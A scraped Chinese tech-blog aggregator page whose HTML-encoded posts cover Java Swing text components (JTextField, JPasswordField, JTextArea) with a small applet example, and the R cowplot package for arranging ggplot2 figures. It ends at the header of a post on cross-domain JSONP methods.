<li>addActionListener(ActionListener )&#xFF0C;&#x4E3A;&#x6587;&#x672C;&#x6846;&#x8BBE;&#x7F6E;&#x52A8;&#x4F5C;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x6307;&#x5B9A;ActionListener&#x5BF9;&#x8C61;&#x63A5;&#x6536;&#x8BE5;&#x6587;&#x672C;&#x6846;&#x4E0A;&#x53D1;&#x751F;&#x7684;&#x8F93;&#x5165;&#x7ED3;&#x675F;&#x52A8;&#x4F5C;&#x4E8B;&#x4EF6;&#x3002;</li>
<li>removeActionListener(ActionListener)&#x79FB;&#x53BB;&#x6587;&#x672C;&#x6846;&#x76D1;&#x89C6;&#x5668;&#x3002;</li>
<li>getColumns(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x7684;&#x5217;&#x6570;&#x3002;</li>
<li>getMinimumSize(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getMinimumSize(int), &#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getPreferredSize(),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5E0C;&#x671B;&#x5177;&#x6709;&#x7684;&#x5C3A;&#x5BF8;&#x3002;</li>
<li>getPreferredSize(int),&#x8FD4;&#x56DE;&#x6587;&#x672C;&#x6846;&#x5728;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5E0C;&#x671B;&#x5177;&#x6709;&#x7684;&#x5C3A;&#x5BF8;&#x3002;</li>
</ol>
<p>&#x3010;&#x4F8B; 11-8&#x3011;&#x5C0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x3002;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x7528;&#x4E8E;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x6846;&#x663E;&#x793A;&#x8FD9;&#x4E2A;&#x6574;&#x6570;&#x7684;&#x5E73;&#x65B9;&#x503C;&#x3002;&#x7A0B;&#x5E8F;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x57FA;&#x672C;&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;Long.parseLong(text1.getText())&#xFF0C;&#x8BFB;&#x53D6;&#x6587;&#x672C;&#x6846;text1&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5E76;&#x5C06;&#x5B83;&#x8F6C;&#x6362;&#x6210;&#x6574;&#x6570;&#x3002;&#x7A0B;&#x5E8F;&#x7528;Sqr&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x4F5C;&#x4E3A;&#x76D1;&#x89C6;&#x5668;&#xFF0C;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x76D1;&#x89C6;&#x5668;&#x80FD;&#x8BBF;&#x95EE;&#x4E3B;&#x7C7B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x4E3B;&#x7C7B;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x88AB;&#x58F0;&#x660E;&#x4E3A;&#x7C7B;&#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x8BBE;&#x7F6E;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002; </p>
<pre><code><span class="xml"> 1 import java.applet.*;import javax.swing.*;import java.awt.event.*;
 2 public class J508 extends Applet</span><span class="expression">{
 3     <span class="variable">static</span> <span class="variable">JTextField</span> <span class="variable">text</span>1,<span class="variable">text</span>2;
 4     <span class="variable">Sqr</span> <span class="variable">s</span>=<span class="variable">new</span> <span class="variable">Sqr</span>();//&amp;<span class="begin-block">#x</span>521<span class="variable">B</span>;&amp;<span class="begin-block">#x</span>5<span class="variable">EFA</span>;&amp;<span class="begin-block">#x</span>76<span class="variable">D</span>1;&amp;<span class="begin-block">#x</span>89<span class="variable">C</span>6;&amp;<span class="begin-block">#x</span>5668;
 5     <span class="variable">public</span> <span class="variable">void</span> <span class="variable">init</span>(){
 6         <span class="variable">text</span>1=<span class="variable">new</span> <span class="variable">JTextField</span>(10);
 7         <span class="variable">text</span>2=<span class="variable">new</span> <span class="variable">JTextField</span>(10);
 8         <span class="variable">add</span>(<span class="variable">text</span>1);
 9         <span class="variable">add</span>(<span class="variable">text</span>2);
10         <span class="variable">text</span>1<span class="variable">.addActionListener</span>(<span class="variable">s</span>);//&amp;<span class="begin-block">#x</span>7<span class="variable">C</span>7<span class="variable">B</span>;<span class="variable">Sqr</span>&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>9<span class="variable">E</span>;&amp;<span class="begin-block">#x</span>4<span class="variable">F</span>8<span class="variable">B</span>;<span class="variable">s</span>&amp;<span class="begin-block">#x</span>4<span class="variable">F</span>5<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>3<span class="variable">A</span>;<span class="variable">text</span>1&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>76<span class="variable">D</span>1;&amp;<span class="begin-block">#x</span>89<span class="variable">C</span>6;&amp;<span class="begin-block">#x</span>5668;
11     }</span><span class="xml">
12 }
13 class Sqr implements ActionListener</span><span class="expression">{
14     <span class="variable">public</span> <span class="variable">void</span> <span class="variable">actionPerformed</span>(<span class="variable">ActionEvent</span> <span class="variable">e</span>){//&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>9<span class="variable">E</span>;&amp;<span class="begin-block">#x</span>73<span class="variable">B</span>0;&amp;<span class="begin-block">#x</span>63<span class="variable">A</span>5;&amp;<span class="begin-block">#x</span>53<span class="variable">E</span>3;<span class="variable">ActionListener</span>
15         <span class="variable"><span class="keyword">if</span></span>(<span class="variable">e.getSource</span>()==<span class="variable">J</span>508<span class="variable">.text</span>1){
16             <span class="variable">long</span> <span class="variable">n</span>=<span class="variable">Long.parseLong</span>(<span class="variable">J</span>508<span class="variable">.text</span>1<span class="variable">.getText</span>());
17             //&amp;<span class="begin-block">#x</span>5<span class="variable">C</span>06;<span class="variable">text</span>1&amp;<span class="begin-block">#x</span>7684;&amp;<span class="begin-block">#x</span>6587;&amp;<span class="begin-block">#x</span>672<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>8<span class="variable">F</span>6<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>6362;&amp;<span class="begin-block">#x</span>6210;<span class="variable">long</span>&amp;<span class="begin-block">#x</span>578<span class="variable">B</span>;&amp;<span class="begin-block">#x</span>6570;&amp;<span class="begin-block">#x</span>636<span class="variable">E</span>;
18             <span class="variable">J</span>508<span class="variable">.text</span>2<span class="variable">.setText</span>(<span class="variable">String.valueOf</span>(<span class="variable">n</span>*<span class="variable">n</span>));
19             //&amp;<span class="begin-block">#x</span>5<span class="variable">C</span>06;<span class="variable">n</span>*<span class="variable">n</span>&amp;<span class="begin-block">#x</span>8<span class="variable">F</span>6<span class="variable">C</span>;&amp;<span class="begin-block">#x</span>5316;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>3<span class="variable">A</span>;&amp;<span class="begin-block">#x</span>5<span class="variable">B</span>57;&amp;<span class="begin-block">#x</span>7<span class="variable">B</span>26;&amp;<span class="begin-block">#x</span>4<span class="variable">E</span>32;
20         }</span><span class="xml">
21         else</span><span class="expression">{}</span><span class="xml">
22     }
23 }</span>
</code></pre><p>&#x5BC6;&#x7801;&#x6846;(JPasswordField)&#x662F;&#x4E00;&#x4E2A;&#x5355;&#x884C;&#x7684;&#x8F93;&#x5165;&#x7EC4;&#x4EF6;&#xFF0C;&#x4E0E;JTextField&#x57FA;&#x672C;&#x7C7B;&#x4F3C;&#x3002;&#x5BC6;&#x7801;&#x6846;&#x591A;&#x4E00;&#x4E2A;&#x5C4F;&#x853D;&#x529F;&#x80FD;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x8F93;&#x5165;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x4EE5;&#x4E00;&#x4E2A;&#x522B;&#x7684;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x7B26;(&#x4E00;&#x822C;&#x662F;*&#x5B57;&#x7B26;)&#x8F93;&#x51FA;&#x3002;&#x9664;&#x4E86;&#x524D;&#x9762;&#x4ECB;&#x7ECD;&#x7684;&#x6587;&#x672C;&#x6846;&#x7684;&#x65B9;&#x6CD5;&#x5916;&#xFF0C;&#x53E6;&#x6709;&#x4E00;&#x4E9B;&#x5BC6;&#x7801;&#x6846;&#x5E38;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<ol>
<li>getEchoChar(),&#x8FD4;&#x56DE;&#x5BC6;&#x7801;&#x7684;&#x56DE;&#x663E;&#x5B57;&#x7B26;&#x3002;</li>
<li>setEchoChar(char)&#xFF0C;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;&#x6846;&#x7684;&#x56DE;&#x663E;&#x5B57;&#x7B26;&#x3002;</li>
</ol>
<h2 id="&#x6587;&#x672C;&#x533A;">&#x6587;&#x672C;&#x533A;</h2><p>&#x6587;&#x672C;&#x533A;(JTextArea)&#x662F;&#x7A97;&#x4F53;&#x4E2D;&#x4E00;&#x4E2A;&#x653E;&#x7F6E;&#x6587;&#x672C;&#x7684;&#x533A;&#x57DF;&#x3002;&#x6587;&#x672C;&#x533A;&#x4E0E;&#x6587;&#x672C;&#x6846;&#x7684;&#x4E3B;&#x8981;&#x533A;&#x522B;&#x662F;&#x6587;&#x672C;&#x533A;&#x53EF;&#x5B58;&#x653E;&#x591A;&#x884C;&#x6587;&#x672C;&#x3002;javax.swing&#x5305;&#x4E2D;&#x7684;JTextArea&#x7C7B;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x6587;&#x672C;&#x533A;&#x3002;JTextArea&#x7EC4;&#x4EF6;&#x6CA1;&#x6709;&#x4E8B;&#x4EF6;&#x3002;</p>
<p>&#x6587;&#x672C;&#x533A;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7684;&#x57FA;&#x672C;&#x5185;&#x5BB9;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#xFF1A;</p>
<ol>
<li>&#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x540D;&#x3002;</li>
<li>&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>&#x5C06;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x52A0;&#x5165;&#x5230;&#x67D0;&#x4E2A;&#x5BB9;&#x5668;&#x3002;</li>
</ol>
<p>JTextArea&#x7C7B;&#x7684;&#x4E3B;&#x8981;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>JTextArea()&#xFF0C;&#x4EE5;&#x9ED8;&#x8BA4;&#x7684;&#x5217;&#x6570;&#x548C;&#x884C;&#x6570;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(String s),&#x4EE5;s&#x4E3A;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(Strings ,int x,int y)&#xFF0C;&#x4EE5;s&#x4E3A;&#x521D;&#x59CB;&#x503C;&#xFF0C;&#x884C;&#x6570;&#x4E3A;x,&#x5217;&#x6570;&#x4E3A;y,&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
<li>JTextArea(int x,int y)&#x4EE5;&#x884C;&#x6570;&#x4E3A;x,&#x4EE5;&#x5217;&#x6570;&#x4E3A;y&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x5BF9;&#x8C61;&#x3002;</li>
</ol>
<p>JTextArea&#x7C7B;&#x7684;&#x5176;&#x4ED6;&#x5E38;&#x7528;&#x65B9;&#x6CD5;&#xFF1A; </p>
<ol>
<li>setText(String s),&#x8BBE;&#x7F6E;&#x663E;&#x793A;&#x6587;&#x672C;&#xFF0C;&#x540C;&#x65F6;&#x6E05;&#x9664;&#x539F;&#x6709;&#x6587;&#x672C;&#x3002;</li>
<li>getText()&#xFF0C;&#x83B7;&#x53D6;&#x6587;&#x672C;&#x533A;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>insert(String s,int x),&#x5728;&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>replace(String s,int x,int y),&#x7528;&#x7ED9;&#x5B9A;&#x7684;&#x4E00;&#x66FF;&#x6362;&#x4ECE;x&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x5230;y&#x4F4D;&#x7F6E;&#x7ED3;&#x675F;&#x7684;&#x6587;&#x672C;&#x3002;</li>
<li>append(String s)&#xFF0C;&#x5728;&#x6587;&#x672C;&#x533A;&#x8FFD;&#x52A0;&#x6587;&#x672C;&#x3002;</li>
<li>getCarePosition(),&#x83B7;&#x53D6;&#x6587;&#x672C;&#x533A;&#x4E2D;&#x6D3B;&#x52A8;&#x5149;&#x6807;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</li>
<li>setCarePosition(int n)&#xFF0C;&#x8BBE;&#x7F6E;&#x6D3B;&#x52A8;&#x5149;&#x6807;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</li>
<li>setLineWrap(boolean b)&#xFF0C;&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;&#x6362;&#x884C;&#xFF0C;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#xFF0C;&#x4E0D;&#x81EA;&#x52A8;&#x6362;&#x884C;&#x3002;</li>
</ol>
<p>&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x80FD;&#x81EA;&#x52A8;&#x6362;&#x884C;&#x3002;</p>
<p>JTextArea textA = new JTextArea(&#x201C;&#x6211;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#x533A;&#x201D;,10,15);</p>
<p>textA.setLineWrap(true);//&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;&#x6362;&#x884C;</p>
<p>&#x5F53;&#x6587;&#x672C;&#x533A;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x8F83;&#x591A;&#xFF0C;&#x4E0D;&#x80FD;&#x5728;&#x6587;&#x672C;&#x533A;&#x5168;&#x90E8;&#x663E;&#x793A;&#x65F6;&#xFF0C;&#x53EF;&#x7ED9;&#x6587;&#x672C;&#x533A;&#x914D;&#x4E0A;&#x6EDA;&#x52A8;&#x6761;&#x3002;&#x7ED9;&#x6587;&#x672C;&#x533A;&#x8BBE;&#x7F6E;&#x6EDA;&#x52A8;&#x6761;&#x53EF;&#x7528;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code><span class="number">1</span>     <span class="class">JTextArea</span> ta = new <span class="class">JTextArea</span>();
<span class="number">2</span>     <span class="class">JScrollPane</span> jsp = new <span class="class">JScrollPane</span>(ta);//&amp;<span class="symbol">#x7ED9</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x672C</span>;&amp;<span class="symbol">#x533A</span>;&amp;<span class="symbol">#x6DFB</span>;&amp;<span class="symbol">#x52A0</span>;&amp;<span class="symbol">#x6EDA</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6761</span>;
</code></pre><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/jMVF7bI">.spring jdbctemplate&#x6E90;&#x7801;&#x8DDF;&#x8E2A;</a></li>
<li>2.<a href="/articles/b2eMne7">&#x518D;&#x56DE;&#x9996;&#xFF0C;Java&#x6E29;&#x6545;&#x77E5;&#x65B0;&#xFF08;&#x516B;&#xFF09;&#xFF1A;Java&#x57FA;&#x7840;&#x4E4B;&#x5B57;&#x7B26;&#x4E32;</a></li>
<li>3.<a href="/articles/za2Efm3">Java PermGen &#x53BB;&#x54EA;&#x91CC;&#x4E86;?</a></li>
<li>4.<a href="/articles/677JjyM">&#x4F7F;&#x7528;Ant&#x81EA;&#x52A8;&#x5316;&#x6211;&#x4EEC;&#x7684;java&#x9879;&#x76EE;&#x751F;&#x6210;</a></li>
<li>5.<a href="/articles/y6jEj23">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;84&#xFF09;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E4B;&#x5E03;&#x5C40;&#x8BBE;&#x8BA1;</a></li>
<li><p>6.<a href="/articles/vaMvIzm">&#x5173;&#x4E8E;Java&#x914D;&#x7F6E;&#x6587;&#x4EF6;properties&#x7684;&#x5B66;&#x4E60;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/meYF3ir">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;meYF3ir&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Java/">Java</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbb7b63/" title="cowplot：基于ggplot的可视化系统 -" itemprop="url">cowplot：基于ggplot的可视化系统 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="cowplot&#xFF1A;&#x57FA;&#x4E8E;ggplot&#x7684;&#x53EF;&#x89C6;&#x5316;&#x7CFB;&#x7EDF;">cowplot&#xFF1A;&#x57FA;&#x4E8E;ggplot&#x7684;&#x53EF;&#x89C6;&#x5316;&#x7CFB;&#x7EDF;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 10:55:58  <a href="/sites/iE32am">Biostack.org</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.biostack.org/?p=175&amp;utm_source=tuicool" target="_blank" rel="external">http://www.biostack.org/?p=175</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11080136">ggplot2</a><a href="/topics/11100078">&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</a></p>
<h4 id="GitHub_&#x4E3B;&#x9875;&#xFF1A;">GitHub &#x4E3B;&#x9875;&#xFF1A;</h4><p><a href="https://github.com/wilkelab/cowplot" target="_blank" rel="external">https://github.com/wilkelab/cowplot</a></p>
<h4 id="CRAN_&#x5305;&#x5730;&#x5740;&#xFF1A;">CRAN &#x5305;&#x5730;&#x5740;&#xFF1A;</h4><p><a href="http://cran.r-project.org/web/packages/cowplot/index.html" target="_blank" rel="external">http://cran.r-project.org/web/packages/cowplot/index.html</a></p>
<h4 id="&#x5305;&#x63CF;&#x8FF0;&#xFF1A;">&#x5305;&#x63CF;&#x8FF0;&#xFF1A;</h4><p>The cowplot package is a simple add-on to ggplot2. It is meant to provide a publication-ready theme for ggplot2, one that requires a minimum amount of fiddling with sizes of axis labels, plot backgrounds, etc. Its primary purpose is to give my students and postdocs an easy way to make figures that I will approve of. Thus, this package meets my personal needs and tastes. Yours may be different.</p>
<p>Some helpful extensions and modifications to the &#x2018;ggplot2&#x2032; library. In particular, this package makes it easy to combine multiple &#x2018;ggplot2&#x2032; plots into one and label them with letters, e.g. A, B, C, etc., as is often required for scientific publications. The package also provides a streamlined and clean theme that is used in the Wilke lab, hence the package name, which stands for Claus O. Wilke&#x2019;s plot library.</p>
<h4 id="&#x5305;&#x89E3;&#x8BFB;&#xFF1A;">&#x5305;&#x89E3;&#x8BFB;&#xFF1A;</h4><p>&#x73B0;&#x5728;&#x6BCF;&#x6B21;&#x7ED8;&#x5236;GGplot&#x7684;&#x56FE;&#xFF0C;&#x90FD;&#x4F1A;&#x4F7F;&#x7528; theme_bw&#xFF08;&#xFF09;&#x53BB;&#x9664;&#x7070;&#x8272;&#x7684;&#x80CC;&#x666F;&#x4FE1;&#x606F;&#xFF0C;&#x73B0;&#x5728;&#x4F7F;&#x7528;cowplot &#x4F3C;&#x4E4E;&#x53D8;&#x7684;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x56FE;&#x7684;&#x6392;&#x5217;&#x548C;&#x6CE8;&#x91CA;&#x4E5F;&#x53D8;&#x5F97;&#x5F88;&#x7B80;&#x5355;&#x3002;</p>
<h4 id="&#x4EE3;&#x7801;&#x5B9E;&#x4F8B;&#xFF1A;">&#x4EE3;&#x7801;&#x5B9E;&#x4F8B;&#xFF1A;</h4><p>&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>library<span class="params">(ggplot2)</span>
require<span class="params">(cowplot)</span>
plot.mpg &amp;lt;- ggplot<span class="params">(mpg, aes<span class="params">(x = cty, y = hwy, colour = factor<span class="params">(cyl)</span>)</span>)</span> +
            geom_point<span class="params">(size=<span class="number">2.5</span>)</span>
plot.diamonds &amp;lt;- ggplot<span class="params">(diamonds, aes<span class="params">(clarity, fill = cut)</span>)</span> +
                 geom_bar<span class="params">()</span> +
                 theme<span class="params">(axis.text.x = element_text<span class="params">(angle=<span class="number">70</span>, vjust=<span class="number">0.5</span>)</span>)</span>
plot.iris &amp;lt;- ggplot<span class="params">(iris, aes<span class="params">(Sepal.Length, Sepal.Width)</span>)</span> +
             geom_point<span class="params">()</span> + facet_grid<span class="params">(. ~ Species)</span> +
             stat_smooth<span class="params">(method = &amp;quot;lm&amp;quot;)</span> +
             background_grid<span class="params">(major = &amp;apos;y&amp;apos;, minor = &amp;quot;none&amp;quot;)</span> +
             panel_border<span class="params">()</span>
ggdraw<span class="params">()</span> +
  draw_plot<span class="params">(plot.iris, <span class="number">0</span>, .<span class="number">5</span>, <span class="number">1</span>, .<span class="number">5</span>)</span> +
  draw_plot<span class="params">(plot.mpg, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">5</span>, .<span class="number">5</span>)</span> +
  draw_plot<span class="params">(plot.diamonds, .<span class="number">5</span>, <span class="number">0</span>, .<span class="number">5</span>, .<span class="number">5</span>)</span> +
  draw_plot_label<span class="params">(c<span class="params">(&amp;quot;A&amp;quot;, &amp;quot;B&amp;quot;, &amp;quot;C&amp;quot;)</span>, c<span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)</span>, c<span class="params">(<span class="number">1</span>, <span class="number">0.5</span>, <span class="number">0.5</span>)</span>, size = <span class="number">15</span>)</span>
</code></pre><p>&#x7ED3;&#x679C;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/cbb67db.png" alt=""></p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/r2EVJr2">&#x4E92;&#x8054;&#x7F51;+&#x7684;&#x65F6;&#x4EE3;&#xFF0C;&#x4F60;&#x5230;&#x5E95;&#x8981;&#x505A;&#x4EC0;&#x4E48;&#xFF1F;</a></li>
<li>2.<a href="/articles/N3iMFni">&#x8C01;&#x662F; Bill Gross | &#x7845;&#x53D1;&#x5E03;&#x56DE;&#x987E;</a></li>
<li>3.<a href="/articles/32yMNjq">&#x8FC7;&#x53BB;&#x4E00;&#x5468;&#x864E;&#x55C5;&#x4E0A;&#x7684;&#x5341;&#x7BC7;&#x70ED;&#x6587; (6.1&#x2014;6.7)</a></li>
<li>4.<a href="/articles/V7Vn6ry">&#x5BF9;&#x8BDD;&#x5EB7;&#x590F;&#xFF1A;&#x5929;&#x5802;&#x7684;19&#x5929;&#x548C;&#x5730;&#x72F1;&#x7684;24&#x5C0F;&#x65F6;</a></li>
<li>5.<a href="/articles/nEzUzqM">&#x770B;&#x5230;&#x8FD9;&#x4E9B;&#x673A;&#x5668;&#x4EBA;&#x6454;&#x5012;&#xFF0C;&#x4F60;&#x5FC3;&#x91CC;&#x662F;&#x4EC0;&#x4E48;&#x611F;&#x89C9;&#xFF1F;</a></li>
<li><p>6.<a href="/articles/f2uiQbN">&#x5173;&#x7FBD;&#x90FD;&#x60CA;&#x5446;&#x4E86;&#xFF1A;&#x5728;&#x5F00;&#x9885;&#x624B;&#x672F;&#x4E2D;&#x5F39;&#x5409;&#x4ED6;&#x7684;&#x7537;&#x4EBA;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/vEn6Fr">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;vEn6Fr&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/ggplot2/">ggplot2</a><a href="/tags/加密解密/">加密解密</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbb51e2/" title="常用跨域方法实践（一） -" itemprop="url">常用跨域方法实践（一） -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x5E38;&#x7528;&#x8DE8;&#x57DF;&#x65B9;&#x6CD5;&#x5B9E;&#x8DF5;&#xFF08;&#x4E00;&#xFF09;">&#x5E38;&#x7528;&#x8DE8;&#x57DF;&#x65B9;&#x6CD5;&#x5B9E;&#x8DF5;&#xFF08;&#x4E00;&#xFF09;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 16:45:03  <a href="/sites/BnyimiN">&#x98CE;&#x5F71;&#x535A;&#x5BA2;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.chenjunxyf.me/chang-yong-kua-yu-fang-fa-shi-jian/?utm_source=tuicool" target="_blank" rel="external">http://www.chenjunxyf.me/chang-yong-kua-yu-fang-fa-shi-jian/</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11060069">JSONP</a><a href="/topics/11060004">JavaScript</a></p>
